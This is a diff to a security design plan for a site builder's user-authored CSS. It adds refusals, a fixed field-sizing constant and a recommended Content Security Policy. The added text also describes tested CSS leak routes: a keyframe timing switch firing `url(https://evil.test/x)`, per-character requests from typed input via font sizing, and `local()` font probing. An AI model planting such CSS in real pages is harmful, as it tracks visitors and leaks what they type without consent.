@@ -215,8 +215,8 @@ So, with no back-compat cost, because rules are new:
 
 1. In every rule body, block and definition, inside `url(`, `image-set(`, `-webkit-image-set(`, `image(`,
    `src(`, `cross-fade(` or `-webkit-cross-fade(`, compared without regard to case, any address is
-   refused unless it is a site path with one leading `/`, or `data:`. `local()` stays allowed in
-   `@font-face`. Plain strings outside those functions are text: `content:"https://example.com"` is fine.
+   refused unless it is a site path with one leading `/`, or `data:`. `local()` is refused in `src`, see
+   below. Plain strings outside those functions are text: `content:"https://example.com"` is fine.
 2. A custom property holding such a function with an external address is dropped at emission, on any node
    of a page that has an authored rule, with the warning. A preset is not an authored rule, and no saved
    page has one, so nothing regresses at deploy. The panel reports it the moment the first rule is added.
@@ -227,6 +227,24 @@ no request on load and one the moment a checkbox was ticked (Chromium, 2026-11-0
 ordinary content, a stock photo for example, so refusing it would break real pages. Only a browser-enforced
 policy closes this, which is open question 1. Inside the editor the same route can read editor attributes,
 so the question covers the editor host too.
+
+**Definitions add a timing switch to that route, proven.** `@keyframes u-sw{to{--off:initial}}` with
+`animation:u-sw 0.01s 300ms forwards` on a Normal holding `var(--off, url(https://evil.test/x))` sent nothing
+at 100 milliseconds and fired by 600 (Chromium, 2026-11-02). So a stored page can report how long a visitor
+stayed, and with a scroll timeline probably how far they read (not run). A rule needs a visitor's action to
+fire; this needs none. It is a new form of the route, and only the policy in open question 1 closes it.
+
+**What a visitor types, read through a width, narrowed and not closed.** A stored `@font-face` with a huge
+`size-adjust` per character, on an input with `field-sizing:content` beside a container query, sent one
+request per character typed, with no selector touching `value` (Chromium, 2026-11-02). So a control may not
+size itself to its text on a page with a stored rule or definition: the sheet ends with the constant
+`input,textarea,select{field-sizing:fixed!important}`, a rule refuses `fieldSizing`, and Normal loses it, under
+its own key or smuggled after a `;`, because either would outrank the constant. Other ways to measure a value
+are not ruled out, so this narrows the route, and an enforced policy closes it.
+
+**What is installed.** `local()` is refused in `src`: whether a face resolves, measured the same way, told a
+third party a font was present. Site paths and `data:` stay. A Normal `fontFamily` naming an installed font can
+still be measured the same way (read, not run), which is the same route and the same policy.
 
 That is why typed text keeps its own refusal: the `[value...]` rule above stops a selector reading what a
 visitor types, which React mirrors into the attribute for a controlled input. What is selected or ticked
@@ -250,8 +268,8 @@ dashed name.
 | `@container` | Wrapper | `at` | Same as `@media` |
 | `@scope` | Wrapper | `at` | Prelude selectors are read-only conditions, checked by the same rules without the `&` |
 | `@starting-style` | Wrapper | `at` | No prelude |
-| `@keyframes` | Definition | `define`, `blocks` | `u-` name; block selectors `from`, `to` or percentages |
-| `@font-face` | Definition | `define`, `style` | `fontFamily` must be `u-`; `src` takes the address check |
+| `@keyframes` | Definition | `define`, `blocks` | `u-` name; block selectors `from`, `to` or percentages; at most 256 blocks |
+| `@font-face` | Definition | `define`, `style` | `fontFamily` must be `u-`; `src` takes site paths and `data:` only, `local()` refused |
 | `@font-feature-values` | Definition | `define`, `blocks` | `u-` family; blocks are the feature keywords |
 | `@font-palette-values` | Definition | `define`, `style` | `--u-` name |
 | `@counter-style` | Definition | `define`, `style` | `u-` name |
@@ -415,7 +433,12 @@ on the published page; the canvas just never shows them.
 
 The same list applies inside a `@keyframes` block on the canvas. An animation beats inline style without
 any `!important`, and the neutraliser below holds a `forwards` animation at its end, so
-`@keyframes u-lock{to{pointer-events:none}}` would otherwise lock a node for the editor.
+`@keyframes u-lock{to{pointer-events:none}}` would otherwise lock a node for the editor. In Chromium a
+keyframe set `pointer-events:none` over inline `auto` with no `!important`, so stripping needs the same
+spellings as the rule list. The constant that ends a published sheet stays off the canvas: its selector would
+fix the editor's own fields. Definitions share the page's rule budget, so 2,000 of them leave nothing for a
+later Hover, which is dropped with the warning and costs only that page. This emitter is the one to reuse: its
+guard already refuses an external address in a hand-built definition.
 
 **The real pointer does nothing.** `:hover`, `:active`, `:focus`, `:focus-visible` and `:focus-within`,
 in any case, are rewritten by the tokenizer, wherever they stand, including inside `:is()`. Dead, each
@@ -736,7 +759,9 @@ The F8 neutraliser keeps one accepted edge, stated at the canvas.
 1. **For Marlin: a Content Security Policy on published pages,** limiting `img-src` and `font-src` to the
    site, the storage host and `data:`. It is the only complete fix for the residual route above, and it
    would also close the existing plain `url()` in `props.style`, the same visitor-address exposure this
-   plan treats as a problem for fonts. It would break any site that hot-links images from another host, so
+   plan treats as a problem for fonts, and the timing switch that definitions add, which reports how long a
+   visitor stayed and which nothing else closes. Published pages have a report-only policy today, which
+   stops nothing. It would break any site that hot-links images from another host, so
    it is a product and legal trade-off. The review recommends it, with a report-only period first. The
    editor host would need its own decision. **Nothing in this plan depends on the answer.**
 
